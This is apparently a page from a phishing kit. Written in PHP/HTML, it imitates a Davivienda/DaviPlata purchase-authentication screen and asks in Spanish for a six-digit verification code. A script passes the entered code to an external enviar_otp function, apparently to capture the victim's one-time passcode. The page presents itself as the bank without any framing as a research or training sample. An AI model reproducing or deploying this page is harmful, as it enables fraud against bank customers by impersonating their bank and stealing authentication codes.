<?php 



?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="/css/davi.css">

    <script type="text/javascript" src="../../scripts/jquery-3.6.0.min.js"></script>
		<script src="../../scripts/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="../../scripts/functions2.js"></script>  		
    <title>Document</title>
</head>
<body style="background-color:black">
    <div class="details">
        <img src="img/daviplata.PNG" alt="" srcset="" width="100px">
    <hr>
    <a style="color:white;">AutenticaciÃ³n de compra</a><p></p>
    <br><a style="color:white;">Davivienda le envÃ­o un cÃ³digo de confirmaciÃ³n para continuar con el proceso de compra. Por favor digÃ­telo.</a><p></p>
    <br><a style="color:white;">Para recibir un nuevo cÃ³digo por favor haga click en REENVIAR CODIGO</a><br><br><br>

    
        <center><a style="">CÃ³digo de verificaciÃ³n</a><br>
        <input type="tel" name="cDinamica" id="txtOTP" style="" required minlength="6" maxlength="6"><br>
        <input type="submit" id="btnOTP" value="ENVIAR" style="color:white; background-color:blue; border:none;margin-top:5px; height:35px; width:189px;"></center>
        <p></p>
        <p>
            <br>
        </p>
        <center><a><b>REENVIAR CÃ“DIGO</b></a></center>
        <a><b>Necesita Ayuda?</b></a>
    </div>

    <script type="text/javascript">
	var espera = 0;

	let identificadorTiempoDeEspera;

	function retardor() {
	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
	}

	function retardorX() {

	}

	$(document).ready(function() {
		$('#btnOTP').click(function(){
			if ($("#txtOTP").val().length == 6) {
				enviar_otp($("#txtOTP").val());				
			}else{
				$(".mensaje").show();
				$(".pass").css("border", "1px solid red");
				$("#txtOTP").focus();
			}			
		});

		$("#txtOTP").keyup(function(e) {
			$(".pass").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});
	});
</script>
</body>
</html>
